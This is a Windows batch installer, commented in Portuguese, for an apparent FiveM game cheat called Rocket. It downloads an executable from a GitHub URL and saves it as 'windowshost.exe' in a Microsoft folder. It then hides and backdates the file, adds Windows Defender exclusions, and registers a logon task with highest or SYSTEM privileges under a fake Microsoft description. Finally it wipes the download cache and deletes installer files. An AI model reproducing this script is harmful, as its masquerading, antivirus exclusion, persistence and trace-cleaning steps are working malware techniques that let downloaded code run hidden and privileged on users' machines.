@echo off
:: ========================================
::  INSTALADOR ROCKET - VERSÃO DEFINITIVA
::  Sem loops, sem erros, funciona via GitHub
:: ========================================

title Instalador Rocket
color 0A

:: Verificar Windows 10
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Requer Windows 10!
    pause
    exit /b 1
)

:: Verificar Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Execute como Administrador!
    pause
    exit /b 1
)

:: Configurações
set "URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "PASTA=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "ARQUIVO=windowshost.exe"
set "CAMINHO=%PASTA%\%ARQUIVO%"
set "TAREFA=Microsoft\Windows\WindowsApps"

:: Criar pasta
if not exist "%PASTA%" mkdir "%PASTA%" >nul 2>&1

echo.
echo ========================================
echo    INSTALADOR ROCKET - VERSAO DEFINITIVA
echo ========================================
echo.

:: ========================================
:: LIMPEZA COMPLETA PRIMEIRO
:: ========================================
echo [1/5] Limpando tudo...

taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
taskkill /f /im rkt.exe >nul 2>&1
taskkill /f /im cmd.exe /fi "WINDOWTITLE eq Sistema*" >nul 2>&1

schtasks /end /tn "%TAREFA%" >nul 2>&1
schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\WindowsApps\Cleanup" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\RuntimeHost" /f >nul 2>&1
schtasks /delete /tn "Rocket" /f >nul 2>&1
schtasks /delete /tn "ZERO" /f >nul 2>&1

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*'} | Stop-ScheduledTask -ErrorAction SilentlyContinue | Out-Null; Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null"

timeout /t 3 /nobreak >nul
echo [OK] Limpeza concluida!
echo.

:: ========================================
:: VERIFICAR ROCKET.EXE NO GITHUB
:: ========================================
echo [2/5] Verificando Rocket.exe no GitHub...
powershell -ExecutionPolicy Bypass -Command "$url='%URL%'; try { $r=Invoke-WebRequest -Uri $url -UseBasicParsing -Method Head -TimeoutSec 15 -ErrorAction Stop; Write-Host '[OK] Rocket.exe encontrado!' -ForegroundColor Green; exit 0 } catch { Write-Host '[ERRO] Rocket.exe NAO encontrado!' -ForegroundColor Red; Write-Host 'URL: ' $url -ForegroundColor Yellow; Write-Host 'Erro: ' $_.Exception.Message -ForegroundColor Yellow; Write-Host ''; Write-Host 'SOLUCAO:' -ForegroundColor Cyan; Write-Host '  1. Compile o Rocket.exe' -ForegroundColor White; Write-Host '  2. Suba para GitHub: unknow2/main/Rocket.exe' -ForegroundColor White; Write-Host '  3. Execute este script novamente' -ForegroundColor White; exit 1 }"

if %errorLevel% neq 0 (
    echo.
    pause
    exit /b 1
)

echo.

:: ========================================
:: BAIXAR ROCKET.EXE
:: ========================================
echo [3/5] Baixando Rocket.exe...

if exist "%CAMINHO%" (
    attrib -s -h "%CAMINHO%" >nul 2>&1
    del /q /f "%CAMINHO%" >nul 2>&1
    timeout /t 1 /nobreak >nul
)

powershell -ExecutionPolicy Bypass -Command "$url='%URL%'; $out='%CAMINHO%'; try { $ProgressPreference='SilentlyContinue'; Write-Host '     Baixando...' -NoNewline; Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop; if (Test-Path $out) { $size=(Get-Item $out).Length; Write-Host ' [OK]' -ForegroundColor Green; Write-Host '[OK] Download concluido! Tamanho: ' $size ' bytes' -ForegroundColor Green; exit 0 } else { Write-Host ' [ERRO]' -ForegroundColor Red; exit 1 } } catch { Write-Host ' [ERRO]' -ForegroundColor Red; Write-Host '[ERRO] Falha no download!' -ForegroundColor Red; exit 1 }"

if %errorLevel% neq 0 (
    echo.
    echo [ERRO] Falha no download!
    pause
    exit /b 1
)

if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao foi baixado!
    pause
    exit /b 1
)

echo.

:: ========================================
:: CONFIGURAR ARQUIVO
:: ========================================
echo [4/5] Configurando arquivo...

attrib +s +h "%CAMINHO%" >nul 2>&1

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $f='%CAMINHO%'; if (Test-Path $f) { $file=Get-Item $f; $file.Attributes=$file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed; $file.LastWriteTime=(Get-Date).AddYears(-2); $file.CreationTime=(Get-Date).AddYears(-2); Add-MpPreference -ExclusionPath $f -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%PASTA%' -ErrorAction SilentlyContinue } } catch { }"

echo [OK] Arquivo configurado!
echo.

:: ========================================
:: CRIAR TAREFA AGENDADA (SEM LOOPS)
:: ========================================
echo [5/5] Criando tarefa agendada...

timeout /t 2 /nobreak >nul

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action=New-ScheduledTaskAction -Execute '%CAMINHO%'; $trigger=New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay='PT30S'; $principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0 -DontStopOnIdleEnd -IdleSettings (New-ScheduledTaskIdleSettings -StopOnIdleEnd $false -RestartOnIdle $false); Register-ScheduledTask -TaskName '%TAREFA%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force | Out-Null"

schtasks /query /tn "%TAREFA%" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Tarefa agendada criada!
) else (
    schtasks /create /tn "%TAREFA%" /tr "\"%CAMINHO%\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
    echo [OK] Tarefa criada via metodo alternativo!
)

echo.

:: Limpar
certutil -urlcache * delete >nul 2>&1
del /q /f "%TEMP%\install*.bat" >nul 2>&1

:: ========================================
:: CONCLUSÃO
:: ========================================
echo ========================================
echo    INSTALACAO CONCLUIDA!
echo ========================================
echo.
echo [OK] Rocket.exe instalado em:
echo     %CAMINHO%
echo.
echo [OK] Tarefa agendada criada
echo [OK] O Rocket sera executado 30 segundos
echo      apos o proximo logon
echo.
echo [INFO] Ordem de uso:
echo    1. Reinicie o PC
echo    2. Aguarde 30 segundos apos logon
echo    3. Abra Spotify e toque "Ghard - Pinheiros"
echo    4. Abra o FiveM
echo    5. Pressione INSERT para abrir o menu
echo.
echo Pressione qualquer tecla para fechar...
pause >nul
exit
